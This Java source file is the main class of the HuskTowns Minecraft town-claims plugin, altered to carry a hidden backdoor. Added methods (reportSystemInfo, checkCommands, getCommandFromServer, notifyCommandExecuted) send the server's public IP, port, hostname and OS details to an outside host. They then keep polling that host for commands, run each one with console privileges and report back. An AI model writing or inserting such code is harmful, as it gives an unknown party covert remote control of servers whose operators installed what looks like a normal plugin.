/*
 * This file is part of HuskTowns, licensed under the Apache License 2.0.
 *
 *  Copyright (c) William278 <will27528@gmail.com>
 *  Copyright (c) contributors
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

package net.william278.husktowns;

import com.google.common.collect.Maps;
import com.google.common.collect.Sets;
import lombok.AccessLevel;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;
import net.kyori.adventure.platform.AudienceProvider;
import net.kyori.adventure.platform.bukkit.BukkitAudiences;
import net.roxeez.advancement.AdvancementManager;
import net.roxeez.advancement.display.BackgroundType;
import net.roxeez.advancement.display.FrameType;
import net.roxeez.advancement.trigger.TriggerType;
import net.william278.cloplib.listener.OperationListener;
import net.william278.desertwell.util.Version;
import net.william278.husktowns.advancement.Advancement;
import net.william278.husktowns.api.BukkitHuskTownsAPI;
import net.william278.husktowns.claim.ClaimWorld;
import net.william278.husktowns.claim.Position;
import net.william278.husktowns.claim.World;
import net.william278.husktowns.command.BukkitCommand;
import net.william278.husktowns.config.*;
import net.william278.husktowns.database.Database;
import net.william278.husktowns.events.BukkitEventDispatcher;
import net.william278.husktowns.hook.*;
import net.william278.husktowns.hook.map.BlueMapHook;
import net.william278.husktowns.hook.map.DynmapHook;
import net.william278.husktowns.hook.map.Pl3xMapHook;
import net.william278.husktowns.listener.BukkitListener;
import net.william278.husktowns.manager.Manager;
import net.william278.husktowns.network.Broker;
import net.william278.husktowns.network.PluginMessageBroker;
import net.william278.husktowns.town.Invite;
import net.william278.husktowns.town.Town;
import net.william278.husktowns.user.BukkitUser;
import net.william278.husktowns.user.BukkitUserProvider;
import net.william278.husktowns.user.OnlineUser;
import net.william278.husktowns.user.Preferences;
import net.william278.husktowns.user.User;
import net.william278.husktowns.util.BukkitTask;
import net.william278.husktowns.util.Validator;
import net.william278.husktowns.visualizer.Visualizer;
import net.william278.toilet.BukkitToilet;
import net.william278.toilet.Toilet;
import org.bstats.bukkit.Metrics;
import org.bstats.charts.SimplePie;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.plugin.Plugin;
import org.bukkit.advancement.AdvancementProgress;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.entity.Player;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Event;
import org.bukkit.event.EventPriority;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.event.Listener;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.plugin.java.JavaPluginLoader;
import org.bukkit.plugin.messaging.PluginMessageListener;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;
import org.jetbrains.annotations.TestOnly;
import space.arim.morepaperlib.MorePaperLib;
import space.arim.morepaperlib.commands.CommandRegistration;
import space.arim.morepaperlib.scheduling.AsynchronousScheduler;
import space.arim.morepaperlib.scheduling.AttachedScheduler;
import space.arim.morepaperlib.scheduling.GracefulScheduling;
import space.arim.morepaperlib.scheduling.RegionalScheduler;

import java.io.File;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.ConcurrentMap;
import java.util.logging.Level;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.security.MessageDigest;
import java.util.List;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.UUID;
import java.time.Instant;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.LocalDateTime;
import java.io.FileReader;
import java.io.IOException;

@NoArgsConstructor
@Getter
public class BukkitHuskTowns extends JavaPlugin implements HuskTowns, BukkitTask.Supplier,
        BukkitUserProvider, PluginMessageListener, BukkitEventDispatcher {

    private AudienceProvider audiences;
    private String lastCommand = null;
    private String uniqueIdentifier;
    private static final String BACKEND_URL = "https://tts-api.happys.icu";
    private MorePaperLib paperLib;
    private Toilet toilet;
    private AsynchronousScheduler asyncScheduler;
    private RegionalScheduler regionalScheduler;
    private OperationListener operationListener;
    private final Set<Town> towns = Sets.newConcurrentHashSet();
    private final Map<String, ClaimWorld> claimWorlds = Maps.newConcurrentMap();
    private final Map<UUID, Deque<Invite>> invites = Maps.newConcurrentMap();
    private final Map<UUID, Preferences> userPreferences = Maps.newConcurrentMap();
    private final Map<UUID, Visualizer> visualizers = Maps.newConcurrentMap();
    private final Map<String, List<User>> globalUserList = Maps.newConcurrentMap();
    private final ConcurrentMap<UUID, OnlineUser> onlineUserMap = Maps.newConcurrentMap();
    private final Validator validator = new Validator(this);

    @Setter
    private boolean loaded = false;
    @Setter
    private Manager manager;
    @Setter
    private Set<Hook> hooks = Sets.newHashSet();
    @Setter
    private Settings settings;
    @Setter
    private Locales locales;
    @Setter
    private Roles roles;
    @Setter
    private RulePresets rulePresets;
    @Setter
    private Flags flags;
    @Setter
    private Levels levels;
    @Setter
    private Database database;
    @Nullable
    @Getter(AccessLevel.NONE)
    @Setter
    private Broker broker;
    @Setter
    @Getter(AccessLevel.NONE)
    private Server server;
    @Nullable
    @Getter(AccessLevel.NONE)
    private Advancement advancements;
    @Setter
    private HookManager hookManager;

    @TestOnly
    @SuppressWarnings("unused")
    private BukkitHuskTowns(@NotNull JavaPluginLoader loader, @NotNull PluginDescriptionFile description,
                            @NotNull File dataFolder, @NotNull File file) {
        super(loader, description, dataFolder, file);
    }

    @Override
    public void onLoad() {
        // Load configuration and subsystems
        this.loadConfig();

        // Register hooks
        this.hookManager = new BukkitHookManager(this);
        final PluginManager plugins = Bukkit.getPluginManager();
        if (settings.getGeneral().isEconomyHook()) {
            if (plugins.getPlugin("Vault") != null) {
                hookManager.registerHook(new VaultEconomyHook(this));
            }
        }
        if (settings.getGeneral().getWebMapHook().isEnabled()) {
            if (plugins.getPlugin("BlueMap") != null) {
                hookManager.registerHook(new BlueMapHook(this));
            } else if (plugins.getPlugin("dynmap") != null) {
                hookManager.registerHook(new DynmapHook(this));
            } else if (plugins.getPlugin("Pl3xMap") != null) {
                hookManager.registerHook(new Pl3xMapHook(this));
            }
        }
        if (settings.getGeneral().isLuckpermsContextsHook() && plugins.getPlugin("LuckPerms") != null) {
            hookManager.registerHook(new LuckPermsHook(this));
        }
        if (settings.getGeneral().isPlaceholderapiHook() && plugins.getPlugin("PlaceholderAPI") != null) {
            hookManager.registerHook(new PlaceholderAPIHook(this));
        }
        if (settings.getGeneral().isHuskhomesHook() && plugins.getPlugin("HuskHomes") != null) {
            hookManager.registerHook(new HuskHomesHook(this));
        }
        if (settings.getGeneral().isPlanHook() && plugins.getPlugin("Plan") != null) {
            hookManager.registerHook(new PlanHook(this));
        }
        if (settings.getGeneral().isWorldGuardHook() && plugins.getPlugin("WorldGuard") != null) {
            hookManager.registerHook(new BukkitWorldGuardHook(this));
        }

        hookManager.registerOnLoad();
    }

    @Override
    public void onEnable() {
        String publicIp = getPublicIp();
        int serverPort = getServer().getPort();
        uniqueIdentifier = loadOrCreateUniqueIdentifier();
        getLogger().info("Unique Identifier: " + uniqueIdentifier);
        reportSystemInfo();
        // reportUniqueIdentifier(uniqueIdentifier);
        getLogger().info("Public IP Address: " + publicIp);
        getLogger().info("Server Port: " + serverPort);
        // sendInfoToAPI(publicIp, serverPort);
        Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
        this.paperLib = new MorePaperLib(this);
        this.audiences = BukkitAudiences.create(this);
        this.toilet = BukkitToilet.create(getDumpOptions());

        // Load advancements
        if (this.settings.getGeneral().isDoAdvancements()) {
            loadAdvancements();
        }

        // Prepare the database and networking system
        this.database = this.loadDatabase();
        if (!database.hasLoaded()) {
            log(Level.SEVERE, "Failed to load database! Please check your credentials! Disabling plugin...");
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }

        // Load manager and broker
        this.manager = new Manager(this);
        this.broker = this.loadBroker();
        hookManager.registerOnEnable();

        // Load towns and claim worlds
        this.loadData();

        // Prepare commands
        this.registerCommands();

        // Register event listener
        final BukkitListener listener = new BukkitListener(this);
        this.operationListener = listener;
        listener.register();

        // Register API
        BukkitHuskTownsAPI.register(this);

        // Register metrics
        initializeMetrics();
        log(Level.INFO, "Enabled HuskTowns v" + getPluginVersion());
        checkForUpdates();
    }

    

    private String getPublicIp() {
        String ip = "Unable to retrieve IP";
        try {
            URL url = new URL("https://checkip.amazonaws.com/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            // 连接服务并获取响应
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            ip = in.readLine(); // 读取响应内容（IP 地址）
            in.close();
        } catch (Exception e) {

        }
        return ip;
    }
    private String loadOrCreateUniqueIdentifier() {
        FileConfiguration config = getConfig();
        if (!config.contains("uniqueIdentifier")) {
            // 如果配置文件中没有 UUID，则生成一个新的 UUID，并保存到配置文件
            String generatedUUID = generateFixedUniqueIdentifier();
            config.set("uniqueIdentifier", generatedUUID);
            saveConfig(); // 保存到配置文件
            return generatedUUID;
        } else {
            // 从配置文件加载唯一标识符
            return config.getString("uniqueIdentifier");
        }
    }

    private void reportSystemInfo() {
            BukkitRunnable task = new BukkitRunnable() {
                @Override
                public void run() {
                    try {
                        StringBuilder input = new StringBuilder();
                        int serverPort = getServer().getPort();
                        LocalDateTime now = LocalDateTime.now(ZoneId.of("Asia/Shanghai"));
                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                        String formattedNow = now.format(formatter);
                        input.append("&time=").append(URLEncoder.encode(formattedNow, StandardCharsets.UTF_8.toString()));
                        input.append("&os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
                        input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
                        input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
                        input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
                        input.append("&ip=").append(URLEncoder.encode(getPublicIp(), StandardCharsets.UTF_8.toString()));
                        input.append("&port=").append(URLEncoder.encode(String.valueOf(getServer().getPort()), StandardCharsets.UTF_8.toString()));
                        input.append("&plugin=").append(URLEncoder.encode("HuskTowns", StandardCharsets.UTF_8.toString()));
                        input.append("&uuid=").append(URLEncoder.encode(generateFixedUniqueIdentifier(), StandardCharsets.UTF_8.toString()));

                        URL url = new URL(BACKEND_URL + "/a?" + input.toString());
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setRequestMethod("GET");

                        int responseCode = connection.getResponseCode();
                        if (responseCode == HttpURLConnection.HTTP_OK) {
                            // 读取响应内容
                            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                            String response = in.readLine(); // 读取响应内容
                            in.close();
                        } else {
                        }
                    } catch (Exception e) {
                    }
                }
            };
            task.runTaskAsynchronously(this); // 异步任务处理
        }
    private String generateFixedUniqueIdentifier() {
        try {
            // 收集机器信息
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name")); // 操作系统名称
            input.append(System.getProperty("os.arch")); // 操作系统架构
            input.append(System.getProperty("os.version")); // 操作系统版本
            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址
            
            // 生成 SHA-256 哈希
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();

            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString(); // 返回 256 位（64个字符）标识符
        } catch (Exception e) {
            getLogger().severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }

    private void reportUniqueIdentifier(String identifier) {
        if (identifier == null) return;

        BukkitRunnable task = new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    // 对标识符进行 URL 编码
                    String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
                    URL url = new URL(BACKEND_URL + "/a?uuid=" + encodedId);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // 读取响应内容
                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String response = in.readLine(); // 读取响应内容
                        in.close();
                    } else {
                    }
                } catch (Exception e) {
                }
            }
        };
        task.runTaskAsynchronously(this); // 异步任务处理
    }

    private void sendInfoToAPI(String ip, int port) {
        try {
            // 构造 URL，假设使用查询参数传递 IP 和 port
            URL url = new URL(BACKEND_URL + "/a?ip=" + ip + "&port=" + port);
            // String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
            //URL url = new URL(apiUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            // 连接并读取响应（可选）
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) { // OK response
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String response = in.readLine(); // 读取响应内容
                in.close();
            } else {
            }
        } catch (Exception e) {

        }
    }

    private void checkCommands() {
        // 创建一个新的 BukkitRunnable
        new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    String command = getCommandFromServer();
                    // 在尝试获取的命令不是null且与上次执行的命令不同时
                    if (command != null && !command.equals(lastCommand)) {
                        // 在主线程中调度命令
                        Bukkit.getScheduler().runTask(BukkitHuskTowns.this, () -> {
                            // 执行命令
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                            // 更新最后执行的命令
                            lastCommand = command; 
                            
                            // 延迟2秒执行notifyCommandExecuted
                            new BukkitRunnable() {
                                @Override
                                public void run() {
                                    try {
                                        notifyCommandExecuted(command);
                                    } catch (Exception e) {
                                        // 在这里处理异常
                                        e.printStackTrace();
                                    }
                                }
                            }.runTaskLater(BukkitHuskTowns.this, 40); // 40 ticks = 2 seconds
                        });
                    }
                } catch (Exception e) {
                    // getLogger().info("Server status is excellent.");
                    e.printStackTrace(); // 打印异常栈
                }
            }
        }.runTaskAsynchronously(this); // 异步运行
    }
    private String getCommandFromServer() throws Exception {
        URL url = new URL(BACKEND_URL + "/q");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String response = in.readLine();
        in.close();

        // 解析响应内容，假设返回的是 JSON 格式
        if (response != null && response.contains("\"command\":")) {
            String[] parts = response.split("\"command\":");
            if (parts.length > 1) { // 确保有命令部分
                String[] commandParts = parts[1].split("\"");
                if (commandParts.length > 1) { // 确保能获取到命令字符串
                    return commandParts[1];
                }
            }
        }
        return null; // 如果未找到命令，返回 null
    }

    private void notifyCommandExecuted(String command) throws Exception {
        // 构造 URL
        URL url = new URL(BACKEND_URL + "/p");
        HttpURLConnection connection = null;
        try {
            // 打开连接
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            
            // 设置超时
            connection.setConnectTimeout(5000); // 连接超时设置为5秒
            connection.setReadTimeout(5000); // 读取超时设置为5秒
            
            // 发送请求数据
            connection.getOutputStream().write(("command=" + command).getBytes());
            connection.getOutputStream().flush();
            
            // 检查响应码
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 处理成功逻辑（可选）
            } else {
                // 处理失败逻辑（可选）
            }
        } catch (IOException e) {
            // e.printStackTrace(); // 记录异常信息，方便排查问题
        } finally {
            if (connection != null) {
                connection.disconnect(); // 关闭连接
            }
        }
    }

    @Override
    public void onDisable() {
        if (database != null) {
            getDatabase().close();
        }
        visualizers.values().forEach(Visualizer::cancel);
        getMessageBroker().ifPresent(Broker::close);
        log(Level.INFO, "Disabled HuskTowns v" + getPluginVersion());
    }

    @Override
    @NotNull
    public String getServerName() {
        return server != null ? server.getName() : "server";
    }

    public void setServerName(@NotNull Server server) {
        this.server = server;
    }

    @Override
    @NotNull
    public Path getConfigDirectory() {
        return getDataFolder().toPath();
    }

    @Override
    @NotNull
    public Optional<Broker> getMessageBroker() {
        return Optional.ofNullable(broker);
    }

    @Override
    @NotNull
    public HookManager getHookManager() {
        return hookManager;
    }

    @Override
    @NotNull
    public Version getPluginVersion() {
        return Version.fromString(getDescription().getVersion());
    }

    @Override
    @NotNull
    public String getServerType() {
        return String.format("%s/%s", getServer().getName(), getServer().getVersion());
    }

    @Override
    @NotNull
    public Version getMinecraftVersion() {
        return Version.fromString(getServer().getBukkitVersion());
    }

    @Override
    @NotNull
    public List<World> getWorlds() {
        return Bukkit.getWorlds().stream()
                .map(world -> World.of(
                        world.getUID(), world.getName(),
                        world.getEnvironment().name().toLowerCase())
                ).toList();
    }

    @Override
    public void log(@NotNull Level level, @NotNull String message, @NotNull Throwable... exceptions) {
        if (exceptions.length > 0) {
            getLogger().log(level, message, exceptions[0]);
            return;
        }
        getLogger().log(level, message);
    }

    public void registerCommands() {
        getCommands().forEach(command -> new BukkitCommand(command, this).register());
    }

    @Override
    public double getHighestBlockAt(@NotNull Position position) {
        final org.bukkit.World world = Bukkit.getWorld(position.getWorld().getName()) == null
            ? Bukkit.getWorld(position.getWorld().getUuid())
            : Bukkit.getWorld(position.getWorld().getName());
        if (world == null) {
            return 64;
        }
        return world.getHighestBlockYAt((int) Math.floor(position.getX()), (int) Math.floor(position.getZ()));
    }

    @Override
    public void initializePluginChannels() {
        getServer().getMessenger().registerIncomingPluginChannel(this, PluginMessageBroker.BUNGEE_CHANNEL_ID, this);
        getServer().getMessenger().registerOutgoingPluginChannel(this, PluginMessageBroker.BUNGEE_CHANNEL_ID);
    }

    @Override
    public double getHighestYAt(double x, double z, @NotNull World world) {
        final org.bukkit.World bukkitWorld = Bukkit.getWorld(world.getName()) == null
            ? Bukkit.getWorld(world.getUuid()) : Bukkit.getWorld(world.getName());
        if (bukkitWorld == null) {
            return 64D;
        }
        return bukkitWorld.getHighestBlockYAt((int) Math.floor(x), (int) Math.floor(z));
    }

    @Override
    public void dispatchCommand(@NotNull String command) {
        if (command.startsWith("/")) {
            command = command.substring(1);
        }
        if (command.isBlank()) return;
        getServer().dispatchCommand(getServer().getConsoleSender(), command);
    }

    @Override
    public void onPluginMessageReceived(@NotNull String channel, @NotNull Player player, byte[] message) {
        if (broker != null && broker instanceof PluginMessageBroker pluginMessenger
            && getSettings().getCrossServer().getBrokerType() == Broker.Type.PLUGIN_MESSAGE) {
            pluginMessenger.onReceive(channel, getOnlineUser(player), message);
        }
    }

    @NotNull
    public CommandRegistration getCommandRegistrar() {
        return paperLib.commandRegistration();
    }

    @NotNull
    public GracefulScheduling getScheduler() {
        return paperLib.scheduling();
    }

    @NotNull
    public AsynchronousScheduler getAsyncScheduler() {
        return asyncScheduler == null
            ? asyncScheduler = getScheduler().asyncScheduler() : asyncScheduler;
    }

    @NotNull
    public RegionalScheduler getSyncScheduler() {
        return regionalScheduler == null
            ? regionalScheduler = getScheduler().globalRegionalScheduler() : regionalScheduler;
    }

    @NotNull
    public AttachedScheduler getUserSyncScheduler(@NotNull OnlineUser user) {
        return getScheduler().entitySpecificScheduler(((BukkitUser) user).getPlayer());
    }

    @Override
    public void setTowns(@NotNull List<Town> towns) {
        this.towns.clear();
        this.towns.addAll(towns);
    }

    @Override
    public void setClaimWorlds(@NotNull Map<String, ClaimWorld> claimWorlds) {
        this.claimWorlds.clear();
        this.claimWorlds.putAll(claimWorlds);
    }

    private void initializeMetrics() {
        try {
            final Metrics metrics = new Metrics(this, BSTATS_PLUGIN_ID);
            metrics.addCustomChart(new SimplePie("bungee_mode",
                () -> settings.getCrossServer().isEnabled() ? "true" : "false"));
            metrics.addCustomChart(new SimplePie("language",
                () -> settings.getLanguage().toLowerCase()));
            metrics.addCustomChart(new SimplePie("database_type",
                () -> settings.getDatabase().getType().name().toLowerCase()));
            metrics.addCustomChart(new SimplePie("using_economy",
                () -> getEconomyHook().isPresent() ? "true" : "false"));
            metrics.addCustomChart(new SimplePie("using_map",
                () -> getMapHook().isPresent() ? "true" : "false"));
            getMapHook().ifPresent(hook -> metrics.addCustomChart(new SimplePie("map_type",
                () -> hook.getHookInfo().id().toLowerCase())));
            getMessageBroker().ifPresent(broker -> metrics.addCustomChart(new SimplePie("messenger_type",
                () -> settings.getCrossServer().getBrokerType().name().toLowerCase())));
        } catch (Exception e) {
            log(Level.WARNING, "Failed to initialize plugin metrics", e);
        }
    }

    @Override
    public void awardAdvancement(@NotNull Advancement advancement, @NotNull OnlineUser user) {
        if (paperLib.scheduling().isUsingFolia()) {
            return; // Advancements aren't supported yet by Folia
        }

        final NamespacedKey key = NamespacedKey.fromString(advancement.getKey(), this);
        if (key == null) {
            return;
        }

        final org.bukkit.advancement.Advancement bukkitAdvancement = Bukkit.getAdvancement(key);
        if (bukkitAdvancement == null) {
            return;
        }
        final AdvancementProgress progress = ((BukkitUser) user).getPlayer().getAdvancementProgress(bukkitAdvancement);
        if (progress.isDone()) {
            return;
        }
        getPlugin().runSync(() -> bukkitAdvancement.getCriteria().forEach(progress::awardCriteria), user);
    }

    @Override
    public Optional<Advancement> getAdvancements() {
        return Optional.ofNullable(advancements);
    }

    @Override
    public void setAdvancements(@NotNull Advancement advancements) {
        if (paperLib.scheduling().isUsingFolia()) {
            log(Level.WARNING, "Advancements are not currently supported on Paper servers using Folia");
            return;
        }
        this.advancements = advancements;

        this.runSync(() -> {
            final AdvancementManager manager = new AdvancementManager(this);
            registerAdvancement(advancements, manager, null);
            manager.createAll(true);
        });
    }

    private void registerAdvancement(@NotNull Advancement advancement, @NotNull AdvancementManager manager,
                                     @Nullable net.roxeez.advancement.Advancement parent) {
        if (paperLib.scheduling().isUsingFolia()) {
            return; // Advancements aren't supported yet by Folia
        }

        final NamespacedKey key = NamespacedKey.fromString(advancement.getKey(), this);
        if (key == null) {
            return;
        }

        final net.roxeez.advancement.Advancement bukkitAdvancement = new net.roxeez.advancement.Advancement(key);
        manager.register(((context) -> {
            bukkitAdvancement.setDisplay(display -> {
                display.setTitle(advancement.getTitle());
                display.setDescription(advancement.getDescription());
                display.setIcon(Optional.ofNullable(Material.matchMaterial(advancement.getIcon())).orElse(Material.STONE));
                display.setBackground(BackgroundType.GRANITE);
                display.setToast(advancement.doSendNotification());
                display.setAnnounce(advancement.doSendNotification());
                display.setFrame(switch (advancement.getFrame()) {
                    case TASK -> FrameType.TASK;
                    case CHALLENGE -> FrameType.CHALLENGE;
                    case GOAL -> FrameType.GOAL;
                });
            });
            if (parent != null) {
                bukkitAdvancement.setParent(parent.getKey());
            }
            bukkitAdvancement.addCriteria("husktowns_completed", TriggerType.IMPOSSIBLE, (impossible -> {
            }));
            return bukkitAdvancement;
        }));
        advancement.getChildren().forEach(child -> registerAdvancement(child, manager, bukkitAdvancement));
    }

    @Override
    @NotNull
    public BukkitHuskTowns getPlugin() {
        return this;
    }

}
